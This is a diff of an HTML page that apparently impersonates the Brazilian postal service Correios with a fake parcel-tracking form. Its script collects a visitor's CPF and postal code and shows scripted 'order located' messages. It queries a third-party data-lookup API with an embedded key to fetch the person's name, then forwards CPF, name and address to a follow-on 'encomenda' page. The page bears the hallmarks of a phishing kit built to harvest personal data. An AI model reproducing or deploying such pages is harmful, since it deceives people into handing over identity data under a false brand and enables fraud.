@@ -252,151 +252,150 @@
       <span>© Copyright 2024 Correios</span>
     </div>
   </footer>
+<script>
+  document.getElementById('consultar-btn').addEventListener('click', async function () {
+    const popupOverlay = document.getElementById('popup-overlay');
+    const loadingSection = document.getElementById('loading-section');
+    const resultSection = document.getElementById('result-section');
+    const messageStep = document.getElementById('message-step');
+    const messages = [
+      "Iniciando a busca por pedidos vinculados ao nome...",
+      "Produto localizado com sucesso...",
+      "Aguarde...",
+    ];
 
-  <script>
-    document.getElementById('consultar-btn').addEventListener('click', async function () {
-      const popupOverlay = document.getElementById('popup-overlay');
-      const loadingSection = document.getElementById('loading-section');
-      const resultSection = document.getElementById('result-section');
-      const messageStep = document.getElementById('message-step');
-      const messages = [
-        "Iniciando a busca por pedidos vinculados ao nome...",
-        "Produto localizado com sucesso...",
-        "Aguarde...",
-      ];
+    popupOverlay.style.display = 'flex';
+    loadingSection.style.display = 'block';
+    resultSection.style.display = 'none';
 
-      popupOverlay.style.display = 'flex';
-      loadingSection.style.display = 'block';
-      resultSection.style.display = 'none';
+    for (const message of messages) {
+      messageStep.textContent = message;
+      await new Promise(resolve => setTimeout(resolve, 2000));
+    }
 
-      for (const message of messages) {
-        messageStep.textContent = message;
-        await new Promise(resolve => setTimeout(resolve, 2000));
-      }
-
-      try {
-        const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
-        const cep = document.getElementById('cep').value.replace(/\D/g, '');
-
-        // Nova API de CPF
-        const nomeResponse = await fetch(`https://api.dataget.tech/?cpf=${cpf}&api_key=ISu11SQHjMJr`)
-          .then(res => res.json())
-          .catch(() => ({ dados: { nome: "Nome não disponível" } }));
-
-        const cepResponse = await fetch(`https://viacep.com.br/ws/${cep}/json/`)
-          .then(res => res.json())
-          .catch(() => ({ cep: cep, logradouro: "Endereço não disponível", localidade: "Cidade não disponível", uf: "Estado não disponível" }));
-
-        document.getElementById('popup-nome-cliente').textContent = nomeResponse.dados.nome || "Nome não disponível";
-        document.getElementById('popup-cep-result').textContent = cepResponse.cep || cep;
-        document.getElementById('popup-cep-rua').textContent = cepResponse.logradouro || "Endereço não disponível";
-        document.getElementById('popup-cep-cidade').textContent = cepResponse.localidade || "Cidade não disponível";
-        document.getElementById('popup-cep-estado').textContent = cepResponse.uf || "Estado não disponível";
-
-        const prazo = new Date();
-        prazo.setDate(prazo.getDate() + 2);
-        document.getElementById('popup-prazo').textContent = prazo.toLocaleDateString('pt-BR');
-
-        loadingSection.style.display = 'none';
-        resultSection.style.display = 'block';
-      } catch (error) {
-        console.error('Erro ao buscar informações:', error);
-        loadingSection.style.display = 'none';
-        resultSection.style.display = 'block';
-      }
-    });
-
-    // Funções de formatação e eventos mantidos
-    document.getElementById('form-rastreamento').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      document.getElementById('consultar-btn').click();
-    });
-
-    document.getElementById('confirmar-btn').addEventListener('click', function () {
+    try {
       const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
-      const nome = document.getElementById('popup-nome-cliente').textContent;
-      const cep = document.getElementById('popup-cep-result').textContent;
-      const rua = document.getElementById('popup-cep-rua').textContent;
-      const cidade = document.getElementById('popup-cep-cidade').textContent;
-      const estado = document.getElementById('popup-cep-estado').textContent;
+      const cep = document.getElementById('cep').value.replace(/\D/g, '');
 
-      const utmData = window.utmify ? window.utmify.getUtms() : {};
+      // Nova API de CPF
+      const nomeResponse = await fetch(`https://api.dataget.tech/?cpf=${cpf}&api_key=ISu11SQHjMJr`)
+        .then(res => res.json())
+        .catch(() => ({ dados: { nome: "Nome não disponível" } }));
 
-      const urlParams = new URLSearchParams({
-        cpf: cpf,
-        nome: encodeURIComponent(nome),
-        cep: cep.replace(/\D/g, ''),
-        rua: encodeURIComponent(rua),
-        cidade: encodeURIComponent(cidade),
-        estado: estado,
-        ...utmData
-      });
+      const cepResponse = await fetch(`https://viacep.com.br/ws/${cep}/json/`)
+        .then(res => res.json())
+        .catch(() => ({ cep: cep, logradouro: "Endereço não disponível", localidade: "Cidade não disponível", uf: "Estado não disponível" }));
 
-      const url = `../encomenda/index.html?${urlParams.toString()}`;
-      console.log("Redirecionando para:", url);
-      window.location.href = url;
-    });
+      document.getElementById('popup-nome-cliente').textContent = nomeResponse.dados.nome || "Nome não disponível";
+      document.getElementById('popup-cep-result').textContent = cepResponse.cep || cep;
+      document.getElementById('popup-cep-rua').textContent = cepResponse.logradouro || "Endereço não disponível";
+      document.getElementById('popup-cep-cidade').textContent = cepResponse.localidade || "Cidade não disponível";
+      document.getElementById('popup-cep-estado').textContent = cepResponse.uf || "Estado não disponível";
 
-    document.getElementById('close-popup').addEventListener('click', function () {
-      document.getElementById('popup-overlay').style.display = 'none';
-    });
+      const prazo = new Date();
+      prazo.setDate(prazo.getDate() + 2);
+      document.getElementById('popup-prazo').textContent = prazo.toLocaleDateString('pt-BR');
 
-    // Funções de formatação de CPF e CEP mantidas
-    function formatarCPF(cpf) {
-      cpf = cpf.replace(/\D/g, '');
-      if (cpf.length > 11) {
-        cpf = cpf.slice(0, 11);
-      }
-      if (cpf.length <= 3) {
-        return cpf;
-      } else if (cpf.length <= 6) {
-        return cpf.replace(/(\d{3})(\d+)/, "$1.$2");
-      } else if (cpf.length <= 9) {
-        return cpf.replace(/(\d{3})(\d{3})(\d+)/, "$1.$2.$3");
-      } else {
-        return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d+)/, "$1.$2.$3-$4");
-      }
+      loadingSection.style.display = 'none';
+      resultSection.style.display = 'block';
+    } catch (error) {
+      console.error('Erro ao buscar informações:', error);
+      loadingSection.style.display = 'none';
+      resultSection.style.display = 'block';
     }
+  });
 
-    function formatarCEP(cep) {
-      cep = cep.replace(/\D/g, '');
-      if (cep.length > 8) {
-        cep = cep.slice(0, 8);
-      }
-      if (cep.length <= 5) {
-        return cep;
-      } else {
-        return cep.replace(/^(\d{5})(\d+)/, "$1-$2");
-      }
+  // Funções de formatação e eventos mantidos
+  document.getElementById('form-rastreamento').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    document.getElementById('consultar-btn').click();
+  });
+
+  document.getElementById('confirmar-btn').addEventListener('click', function () {
+    const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
+    const nome = document.getElementById('popup-nome-cliente').textContent;
+    const cep = document.getElementById('popup-cep-result').textContent;
+    const rua = document.getElementById('popup-cep-rua').textContent;
+    const cidade = document.getElementById('popup-cep-cidade').textContent;
+    const estado = document.getElementById('popup-cep-estado').textContent;
+
+    const utmData = window.utmify ? window.utmify.getUtms() : {}; 
+
+    const urlParams = new URLSearchParams({
+      cpf: cpf,
+      nome: encodeURIComponent(nome),
+      cep: cep.replace(/\D/g, ''),
+      rua: encodeURIComponent(rua),
+      cidade: encodeURIComponent(cidade),
+      estado: estado,
+      ...utmData
+    }); 
+
+    const url = `../encomenda/index.html?${urlParams.toString()}`;
+    console.log("Redirecionando para:", url);
+    window.location.href = url;
+  });
+
+  document.getElementById('close-popup').addEventListener('click', function () {
+    document.getElementById('popup-overlay').style.display = 'none';
+  });
+
+  // Funções de formatação de CPF e CEP mantidas
+  function formatarCPF(cpf) {
+    cpf = cpf.replace(/\D/g, '');
+    if (cpf.length > 11) {
+      cpf = cpf.slice(0, 11);
     }
+    if (cpf.length <= 3) {
+      return cpf;
+    } else if (cpf.length <= 6) {
+      return cpf.replace(/(\d{3})(\d+)/, "$1.$2");
+    } else if (cpf.length <= 9) {
+      return cpf.replace(/(\d{3})(\d{3})(\d+)/, "$1.$2.$3");
+    } else {
+      return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d+)/, "$1.$2.$3-$4");
+    }
+  }
 
-    document.getElementById('cpf').addEventListener('input', function (e) {
-      var start = this.selectionStart;
-      var end = this.selectionEnd;
-      var lastValue = this.value;
-      this.value = formatarCPF(this.value);
-      var newLength = this.value.length;
-      var oldLength = lastValue.length;
-      if (newLength > oldLength) {
-        start += 1;
-        end += 1;
-      }
-      this.setSelectionRange(start, end);
-    });
+  function formatarCEP(cep) {
+    cep = cep.replace(/\D/g, '');
+    if (cep.length > 8) {
+      cep = cep.slice(0, 8);
+    }
+    if (cep.length <= 5) {
+      return cep;
+    } else {
+      return cep.replace(/^(\d{5})(\d+)/, "$1-$2");
+    }
+  }
 
-    document.getElementById('cep').addEventListener('input', function (e) {
-      var start = this.selectionStart;
-      var end = this.selectionEnd;
-      var lastValue = this.value;
-      this.value = formatarCEP(this.value);
-      var newLength = this.value.length;
-      var oldLength = lastValue.length;
-      if (newLength > oldLength) {
-        start += 1;
-        end += 1;
-      }
-      this.setSelectionRange(start, end);
-    });
-  </script>
+  document.getElementById('cpf').addEventListener('input', function (e) {
+    var start = this.selectionStart;
+    var end = this.selectionEnd;
+    var lastValue = this.value;
+    this.value = formatarCPF(this.value);
+    var newLength = this.value.length;
+    var oldLength = lastValue.length;
+    if (newLength > oldLength) {
+      start += 1;
+      end += 1;
+    }
+    this.setSelectionRange(start, end);
+  });
+
+  document.getElementById('cep').addEventListener('input', function (e) {
+    var start = this.selectionStart;
+    var end = this.selectionEnd;
+    var lastValue = this.value;
+    this.value = formatarCEP(this.value);
+    var newLength = this.value.length;
+    var oldLength = lastValue.length;
+    if (newLength > oldLength) {
+      start += 1;
+      end += 1;
+    }
+    this.setSelectionRange(start, end);
+  });
+</script>
 
 </body></html>
